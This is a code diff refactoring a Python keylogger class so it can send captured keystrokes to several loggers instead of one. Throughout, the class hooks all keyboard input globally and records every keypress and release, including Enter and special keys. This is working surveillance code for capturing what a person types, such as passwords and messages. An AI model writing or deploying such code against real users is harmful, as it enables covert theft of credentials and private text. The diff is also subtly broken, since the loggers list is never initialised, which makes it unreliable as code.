@@ -3,22 +3,30 @@ from threading import Timer
 import keylogger_logger
 
 class Keylogger:
-    def __init__(self, logger: keylogger_logger._AbstractLogger):
-        self.logger = logger
-
+    def __init__(self):
         keyboard.hook(callback=self._log_event)
 
     def __del__(self):
-        self.logger.save()
+        for logger in self.loggers:
+            logger.save()
+
+    def add_logger(self, logger: keylogger_logger._AbstractLogger):
+        self.loggers.append(logger)
+        return self
 
     def save_each(self, seconds):
-        self.logger.save()
+        for logger in self.loggers:
+            logger.save()
 
         timer = Timer(interval=seconds, function=self.save_each, args=[[seconds]])
         timer.daemon = True     # set the thread as daemon (dies when main thread dies)
         timer.start()
 
         return self
+
+    def _log(self, key: str):
+        for logger in self.loggers:
+            logger.log(key)
 
     def _log_event(self, event: keyboard.KeyboardEvent):
         if event.event_type == 'down':
@@ -37,15 +45,15 @@ class Keylogger:
         # not a character, special key (e.g ctrl, alt, etc.)
         if name == 'space':
             # ' ' instead of 'space'
-            self.logger += ' '
+            self._log(' ')
         elif name == 'enter':
             # add a new line whenever an ENTER is pressed
-            self.logger += '[ENTER]\n'
+            self._log('[ENTER]\n')
         elif name == 'decimal':
-            self.logger += '.'
+            self._log('.')
         else:
             # replace spaces with underscores
-            self.logger += '[{}]'.format(name.replace(' ', '_').upper())
+            self._log('[{}]'.format(name.replace(' ', '_').upper()))
 
     def _log_keyrelease(self, event):
         name = event.name
@@ -56,7 +64,7 @@ class Keylogger:
         if name in ['space', 'enter']:
             return
 
-        self.logger += '[{}-RELEASE]'.format(name.replace(' ', '_').upper())
+        self._log('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))
 
     def wait(self):
         keyboard.wait()
